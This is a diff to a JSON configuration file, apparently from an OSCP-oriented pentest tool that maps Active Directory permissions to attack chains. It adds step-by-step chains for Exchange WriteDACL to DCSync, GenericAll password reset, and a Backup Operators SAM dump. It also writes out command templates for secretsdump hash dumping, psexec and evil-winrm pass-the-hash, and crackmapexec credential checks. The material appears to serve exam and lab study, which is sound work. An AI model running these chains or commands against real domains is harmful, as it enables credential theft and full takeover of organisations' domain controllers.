@@ -196,7 +196,9 @@
       "evil-winrm-shell"
     ],
     "access_type": null,
-    "user_field": "User",
+    "target_field": "User",
+    "target_is_dc": true,
+    "user_is_discovered": true,
     "context": "Password in description - validate and use",
     "permissions_required": "LDAP read access (any domain user)",
     "post_success": [
@@ -212,7 +214,8 @@
         "description": "Mark as owned in BloodHound",
         "command": null
       }
-    ]
+    ],
+    "discovery_command": true
   },
   "privesc-dcsync-rights": {
     "commands": [
@@ -884,5 +887,200 @@
     "context": "gMSA enumeration",
     "discovery_command": true,
     "permissions_required": "Any authenticated domain user (enumeration only)"
+  },
+  "prereq-account-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Account Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-exchange-writedacl": {
+    "commands": [],
+    "access_type": "WriteDacl",
+    "target_field": "Domain",
+    "context": "Exchange Windows Permissions WriteDACL check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-backup-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Backup Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-server-operators": {
+    "commands": [],
+    "access_type": null,
+    "user_field": "User",
+    "context": "Server Operators membership check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "prereq-can-add-to-group": {
+    "commands": [],
+    "access_type": "AddMember",
+    "user_field": "User",
+    "target_field": "TargetGroup",
+    "context": "AddMember permission check",
+    "purpose": "prerequisite_check",
+    "permissions_required": "None (query only)"
+  },
+  "attack-chain-exchange-writedacl-dcsync": {
+    "commands": [
+      "net-user-add",
+      "net-group-add",
+      "powerview-add-dcsync",
+      "ad-dcsync-impacket-secretsdump-user",
+      "impacket-psexec"
+    ],
+    "access_type": "WriteDacl",
+    "context": "Exchange WriteDACL to DCSync - Full Attack Chain",
+    "permissions_required": "Account Operators membership (nested) + Exchange Windows Permissions has WriteDACL on domain",
+    "prerequisite_queries": [
+      "prereq-account-operators",
+      "prereq-exchange-writedacl"
+    ],
+    "attack_chain": {
+      "id": "exchange-writedacl-dcsync",
+      "name": "Exchange WriteDACL to DCSync",
+      "description": "Abuse Account Operators to add user to Exchange Windows Permissions, then use WriteDACL to grant DCSync rights",
+      "severity": "critical",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Create controlled domain user",
+          "why": "Account Operators can create domain users. We need a user we fully control.",
+          "command": "net-user-add",
+          "context": "on_target",
+          "verification": "net user <NEWUSER> /domain"
+        },
+        {
+          "step_id": 2,
+          "name": "Add user to Exchange Windows Permissions",
+          "why": "Exchange Windows Permissions group has WriteDACL on the domain. Account Operators can add to non-protected groups.",
+          "command": "net-group-add",
+          "context": "on_target",
+          "group": "Exchange Windows Permissions",
+          "verification": "net group \"Exchange Windows Permissions\" /domain"
+        },
+        {
+          "step_id": 3,
+          "name": "Grant DCSync rights via WriteDACL",
+          "why": "WriteDACL allows modifying the domain's DACL. We add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.",
+          "command": "powerview-add-dcsync",
+          "context": "on_target",
+          "prerequisites": [
+            "PowerView.ps1 uploaded"
+          ]
+        },
+        {
+          "step_id": 4,
+          "name": "Execute DCSync attack",
+          "why": "With replication rights, we can request the domain's replication data including all password hashes.",
+          "command": "ad-dcsync-impacket-secretsdump-user",
+          "context": "kali",
+          "result": "Administrator NTLM hash"
+        },
+        {
+          "step_id": 5,
+          "name": "Pass-the-Hash for SYSTEM",
+          "why": "With the Administrator hash, we can authenticate to the DC and get SYSTEM access.",
+          "command": "impacket-psexec",
+          "context": "kali",
+          "result": "SYSTEM shell on Domain Controller"
+        }
+      ]
+    },
+    "post_success": [
+      {
+        "description": "Dump all domain hashes",
+        "command": "impacket-secretsdump -just-dc <DOMAIN>/<NEWUSER>:'<PASSWORD>'@<DC_IP>"
+      },
+      {
+        "description": "Pass-the-Hash as Administrator",
+        "command": "impacket-psexec -hashes :<ADMIN_NTLM> <DOMAIN>/Administrator@<DC_IP>"
+      },
+      {
+        "description": "Alternative: evil-winrm with hash",
+        "command": "evil-winrm -i <DC_IP> -u Administrator -H <ADMIN_NTLM>"
+      }
+    ]
+  },
+  "attack-chain-genericall-password-reset": {
+    "commands": [
+      "net-user-password-reset",
+      "evil-winrm-shell"
+    ],
+    "access_type": "GenericAll",
+    "context": "GenericAll to Password Reset - Quick Win",
+    "permissions_required": "GenericAll ACL on target user",
+    "prerequisite_queries": [],
+    "attack_chain": {
+      "id": "genericall-password-reset",
+      "name": "GenericAll Password Reset",
+      "description": "Abuse GenericAll to reset target user password and use their credentials",
+      "severity": "high",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Reset target user password",
+          "why": "GenericAll includes the ForceChangePassword right, allowing password reset without knowing current password.",
+          "command": "net-user-password-reset",
+          "context": "on_target",
+          "verification": "crackmapexec smb <DC_IP> -u '<TARGET>' -p '<NEW_PASSWORD>'"
+        },
+        {
+          "step_id": 2,
+          "name": "Access target's resources",
+          "why": "With the new password, we can authenticate as the target user and access their resources.",
+          "command": "evil-winrm-shell",
+          "context": "kali",
+          "result": "Shell as target user"
+        }
+      ]
+    }
+  },
+  "attack-chain-backup-operators-sam": {
+    "commands": [
+      "reg-save-sam",
+      "secretsdump-sam"
+    ],
+    "access_type": null,
+    "context": "Backup Operators SAM Dump - Credential Extraction",
+    "permissions_required": "Backup Operators membership",
+    "prerequisite_queries": [
+      "prereq-backup-operators"
+    ],
+    "attack_chain": {
+      "id": "backup-operators-sam",
+      "name": "Backup Operators SAM Dump",
+      "description": "Abuse Backup Operators privileges to backup and extract SAM/SYSTEM hashes",
+      "severity": "high",
+      "oscp_relevance": "high",
+      "steps": [
+        {
+          "step_id": 1,
+          "name": "Backup SAM and SYSTEM hives",
+          "why": "Backup Operators have SeBackupPrivilege, allowing backup of any file including registry hives.",
+          "command": "reg-save-sam",
+          "context": "on_target",
+          "verification": "dir C:\\temp\\sam C:\\temp\\system"
+        },
+        {
+          "step_id": 2,
+          "name": "Extract hashes from hives",
+          "why": "SAM contains local account hashes, SYSTEM contains the key to decrypt them.",
+          "command": "secretsdump-sam",
+          "context": "kali",
+          "result": "Local Administrator NTLM hash"
+        }
+      ]
+    }
   }
 }
